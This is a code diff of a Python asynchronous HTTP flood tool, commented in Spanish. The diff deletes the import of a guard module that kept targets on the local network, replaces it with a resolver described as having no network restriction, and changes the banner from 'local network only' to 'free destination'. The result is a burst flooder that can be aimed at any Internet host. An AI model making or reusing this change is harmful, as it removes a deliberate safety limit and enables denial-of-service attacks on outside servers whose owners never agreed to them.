@@ -5,7 +5,7 @@ Modo de uso principal:
     --requests N --every S    lanza N peticiones y espera S segundos
     --forever                 repite hasta Ctrl+C
 
-El nombre DNS se resuelve una sola vez; las peticiones van a la IP ya validada
+El nombre DNS se resuelve una sola vez; las peticiones van a la IP resuelta
 y llevan el `Host` original para que el servidor virtual correcto responda.
 """
 
@@ -13,19 +13,62 @@ import argparse
 import asyncio
 import json
 import signal
+import socket
 import ssl
 import time
 
-from guard import (
-    MAX_CONCURRENCY,
-    MAX_DURATION,
-    MAX_EVERY,
-    MAX_REQUESTS,
-    GuardError,
-    clamp,
-    parse_target,
-    resolve,
-)
+# Topes duros del laboratorio (por contenedor).
+MAX_REQUESTS = 500       # peticiones por ráfaga
+MAX_CONCURRENCY = 400    # peticiones simultáneas
+MAX_EVERY = 3600.0       # segundos entre ráfagas
+MAX_DURATION = 86400     # segundos (24 h) cuando no es infinito
+
+
+def parse_target(value: str, default_port: int | None = None) -> tuple[str, int]:
+    """Acepta 'host', 'host:puerto' o 'esquema://host:puerto'."""
+    raw = value.strip()
+    if "://" in raw:
+        from urllib.parse import urlparse
+
+        parsed = urlparse(raw)
+        host = parsed.hostname or ""
+        port = parsed.port or default_port
+    elif raw.count(":") == 1:
+        host, _, raw_port = raw.partition(":")
+        port = int(raw_port) if raw_port.isdigit() else default_port
+    else:
+        host, port = raw, default_port
+
+    if not host:
+        raise ValueError(f"destino invalido: '{value}'")
+    if port is None:
+        raise ValueError("falta el puerto: usa --port o 'host:puerto'")
+    if not 1 <= port <= 65535:
+        raise ValueError(f"puerto fuera de rango: {port}")
+    return host, port
+
+
+def resolve(host: str, port: int) -> str:
+    """Resuelve `host` a una dirección IP utilizable, sin restricción de red."""
+    try:
+        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
+    except socket.gaierror as exc:
+        raise ValueError(f"no se pudo resolver '{host}': {exc}") from exc
+
+    for info in infos:
+        if info[4][0]:
+            return info[4][0]
+    raise ValueError(f"'{host}' no tiene direcciones utilizables")
+
+
+def clamp(name: str, value: float, maximum: float) -> float:
+    """Recorta un parámetro al tope duro e informa cuando lo hace."""
+    if value <= 0:
+        raise ValueError(f"{name} debe ser > 0 (recibido {value})")
+    if value > maximum:
+        print(f"[limite] {name}={value} excede el tope del lab, se usa {maximum}")
+        return maximum
+    return value
 
 
 async def _one(
@@ -106,7 +149,7 @@ async def run(args, ip, host_header) -> None:
     # Coherencia: si pides mas ritmo del permitido, recorta la rafaga.
     if requests / every > MAX_REQUESTS:
         requests = max(1, int(MAX_REQUESTS * every))
-        print(f"[guard] ritmo ajustado a {requests} peticiones cada {every:g}s")
+        print(f"[limite] ritmo ajustado a {requests} peticiones cada {every:g}s")
 
     print("=" * 66)
     scheme = "https" if args.https else "http"
@@ -114,7 +157,7 @@ async def run(args, ip, host_header) -> None:
     print(f"  PATRON    : {requests} peticiones cada {every:g}s"
           f"  ({requests / every:.0f} req/s por contenedor)")
     print(f"  MODO      : {'INFINITO (Ctrl+C para parar)' if args.forever else f'{args.duration:g}s'}")
-    print(f"  AMBITO    : solo red local; sin salida a Internet")
+    print(f"  AMBITO    : destino libre (sin restriccion de red)")
     print("=" * 66, flush=True)
 
     ctx = None
@@ -214,7 +257,7 @@ async def run(args, ip, host_header) -> None:
 
 def main() -> None:
     parser = argparse.ArgumentParser(
-        description="Flood HTTP por rafagas (laboratorio de red local)"
+        description="Flood HTTP por rafagas (laboratorio)"
     )
     parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
     parser.add_argument("--port", type=int, required=True, help="puerto del destino")
@@ -235,7 +278,7 @@ def main() -> None:
     try:
         host, port = parse_target(args.dns, args.port)
         ip = resolve(host, port)
-    except GuardError as exc:
+    except ValueError as exc:
         print(f"[abortado] {exc}")
         raise SystemExit(2)
 
@@ -248,7 +291,7 @@ def main() -> None:
         args.duration = clamp("duration", args.duration, MAX_DURATION)
 
     try:
-        asyncio.run(run(args, str(ip), host_header))
+        asyncio.run(run(args, ip, host_header))
     except KeyboardInterrupt:
         print("\n  interrumpido")
 
